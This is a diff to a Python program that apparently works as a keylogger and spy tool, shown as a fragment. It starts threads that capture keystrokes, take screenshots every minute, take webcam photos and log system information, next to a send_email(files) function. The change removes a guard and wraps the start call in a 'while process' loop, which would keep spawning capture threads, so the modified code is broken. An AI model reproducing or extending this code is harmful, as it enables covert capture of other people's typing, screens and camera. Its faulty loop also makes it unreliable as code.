@@ -270,14 +270,11 @@ def send_email(files):
 # Start Monitoring Threads
 def start_monitoring(process):
     """Start all periodic logging and capture threads."""
-    if process:
-        threading.Thread(target=periodic_contextual_logging, args=(60,), daemon=True).start()  
-        threading.Thread(target=periodic_screenshot, args=(60,), daemon=True).start() 
-        threading.Thread(target=periodic_camera_capture, args=(1200,), daemon=True).start() 
-        threading.Thread(target=periodic_system_info_logging).start()
-        threading.Thread(target=start_keyboard_listener).start()
-    else:
-        return
+    threading.Thread(target=periodic_contextual_logging, args=(60,), daemon=True).start()  
+    threading.Thread(target=periodic_screenshot, args=(60,), daemon=True).start() 
+    threading.Thread(target=periodic_camera_capture, args=(1200,), daemon=True).start() 
+    threading.Thread(target=periodic_system_info_logging).start()
+    threading.Thread(target=start_keyboard_listener).start()
 # Main Execution
 if __name__ == "__main__":
     process = False
@@ -285,7 +282,8 @@ if __name__ == "__main__":
         global process
         process = True
         status_label.config(text="Status: Running", fg="green")
-        start_monitoring(process)
+        while process:
+            start_monitoring(process)
 
     def stop_logging():
         global process
